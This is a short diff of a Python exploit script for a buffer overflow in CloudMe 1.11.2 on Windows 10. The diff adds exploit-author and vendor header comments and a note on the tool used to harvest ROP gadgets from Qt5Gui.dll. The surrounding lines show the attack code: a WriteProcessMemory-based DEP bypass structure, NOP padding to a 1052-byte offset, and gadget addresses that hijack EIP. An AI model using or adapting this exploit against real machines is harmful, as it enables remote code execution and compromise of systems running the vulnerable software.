@@ -1,4 +1,10 @@
 #!/usr/bin/python
+# Exploit Author: Xavier Lim (TrickDKing)
+# Vendor Homepage:https://www.cloudme.com/en
+# Software: https://www.cloudme.com/downloads/CloudMe_1112.exe
+# Category: Local
+# Tested on: Windows 10 Pro x64
+
 import socket, sys
 from struct import pack
 
@@ -16,7 +22,9 @@ try:
     wpm += pack("<L", (0x51515151))  # lpNumberOfBytesWritten 
 
     inputBuffer = b"\x90" * (1052 - len(wpm))
-
+    # ROP gadgets are from Qt5Gui.dll
+    # Command: rp-win-x86.exe -f Qt5Gui.dll -r 5 > rop.txt
+    
     # Preserving the stack address
     eip = pack("<L", (0x61bd4a1e))   # push esp ; pop ebx ; pop esi ; ret ;
     rop = pack("<L", (0x90909090))   # Stack alignment for pop esi
